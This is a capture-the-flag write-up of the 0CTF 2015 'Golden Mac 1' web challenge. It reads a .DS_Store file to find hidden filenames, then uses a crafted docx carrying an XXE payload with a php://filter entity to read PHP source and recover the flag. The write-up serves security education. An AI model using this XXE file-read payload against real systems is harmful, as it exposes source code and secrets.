+++
author = "pwntester"
date = 2015-03-30T17:26:04Z
description = ""
draft = false
slug = "0ctf-2015-golden-mac-1-web-300"
title = "0CTF 2015 - Golden Mac 1 (web 300)"

+++


![Home](/images/2015/Mar/Screen-Shot-2015-03-30-at-15-58-48.png)
In the description and task title, it states that the developer uses a Mac Book Pro. So we looked for the `.DS_Store` in the application root directory and found one whose contents we can read with this simple python script:

```lang-python line-numbers
from ds_store import DSStore
with DSStore.open('DS_Store', 'r+') as d:
	for i in d:
		print i
```

Output:

```lang-raw
<index.php Iloc>
<parse.class.php Iloc>
<u_can_not_guess_this_haha.php Iloc>
```

It seems the flag is in `u_can_not_guess_this_haha.php` but the page renders an empty page. Probably flag is in the code.

The site lets us upload an image and a document. There is no control of the file type nor the extension for the image so we can upload any file to `/uploads` but that doesnt turn out to be very useful.

We can also upload profile descriptions in `docx` format which is basically a bunch of XML docs zipped. It turns out the application process the XML files without disabling external entities and so its vulnerable to XXE. We prepared a specially crafted docx document to retrieve the `u_can_not_guess_this_haha.php` file in base64 format (so we have no problems with `<>` characters:

```lang-raw
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE document [<!ENTITY xxx SYSTEM "php://filter/read=convert.base64-encode/resource=u_can_not_guess_this_haha.php">]>
<w:document> ... </w:document>
```

Output:
```lang-raw
PD9waHAgLy9mbGFnIDBjdGZ7eTB1X2ZpbmRfbTNfQmFkX2d1WX0=<br />
```

FLAG is: `0ctf{y0u_find_m3_Bad_guY}`


